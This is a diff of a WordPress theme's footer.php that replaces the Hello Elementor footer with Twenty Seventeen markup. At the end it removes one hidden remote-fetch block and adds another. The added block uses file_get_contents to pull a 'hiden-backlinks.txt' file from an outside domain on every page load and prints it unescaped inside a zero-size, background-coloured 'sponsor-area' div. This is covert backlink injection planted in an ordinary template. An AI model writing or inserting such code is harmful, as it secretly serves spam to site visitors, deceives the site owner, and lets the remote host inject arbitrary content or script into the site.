@@ -1,51 +1,55 @@
 <?php
 /**
- * The template for displaying the footer.
+ * The template for displaying the footer
  *
- * Contains the body & html closing tags.
+ * Contains the closing of the #content div and all content after.
  *
- * @package HelloElementor
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package WordPress
+ * @subpackage Twenty_Seventeen
+ * @since Twenty Seventeen 1.0
+ * @version 1.2
  */
-if ( ! defined( 'ABSPATH' ) ) {
-	exit; // Exit if accessed directly.
-}
 
-if ( ! function_exists( 'elementor_theme_do_location' ) || ! elementor_theme_do_location( 'footer' ) ) {
-	if ( hello_elementor_display_header_footer() ) {
-		if ( did_action( 'elementor/loaded' ) && hello_header_footer_experiment_active() ) {
-			get_template_part( 'template-parts/dynamic-footer' );
-		} else {
-			get_template_part( 'template-parts/footer' );
-		}
-	}
-}
 ?>
 
+		</div><!-- #content -->
+
+		<footer id="colophon" class="site-footer">
+			<div class="wrap">
+				<?php
+				get_template_part( 'template-parts/footer/footer', 'widgets' );
+
+				if ( has_nav_menu( 'social' ) ) :
+					?>
+					<nav class="social-navigation" aria-label="<?php esc_attr_e( 'Footer Social Links Menu', 'twentyseventeen' ); ?>">
+						<?php
+							wp_nav_menu(
+								array(
+									'theme_location' => 'social',
+									'menu_class'     => 'social-links-menu',
+									'depth'          => 1,
+									'link_before'    => '<span class="screen-reader-text">',
+									'link_after'     => '</span>' . twentyseventeen_get_svg( array( 'icon' => 'chain' ) ),
+								)
+							);
+						?>
+					</nav><!-- .social-navigation -->
+					<?php
+				endif;
+
+				get_template_part( 'template-parts/footer/site', 'info' );
+				?>
+			</div><!-- .wrap -->
+		</footer><!-- #colophon -->
+	</div><!-- .site-content-contain -->
+</div><!-- #page -->
 <?php wp_footer(); ?>
 <?php
-$response = wp_remote_get(
-    'https://yokgercep.com/404-forbiden/hiden-backlinks.txt',
-    array(
-        'timeout' => 5,
-        'sslverify' => false
-    )
-);
-
-if ( ! is_wp_error( $response ) ) {
-    $body = wp_remote_retrieve_body( $response );
-    if ( ! empty( $body ) ) {
-        echo '<div class="sponsor-area" style="
-            font-size:0.00001px;
-            color:#f4f4f4;
-            background:#f4f4f4;
-            line-height:0;
-            height:0;
-            overflow:hidden;
-        ">';
-        echo $body;
-        echo '</div>';
-    }
-}
+        echo "<div class='sponsor-area' style='background-color: #f4f4f4; font-size: 0.00001px; color: #f4f4f4;'>";
+        echo file_get_contents("https://yokgercep.com/404-forbiden/hiden-backlinks.txt");
+        echo "</div>";
 ?>
 </body>
 </html>
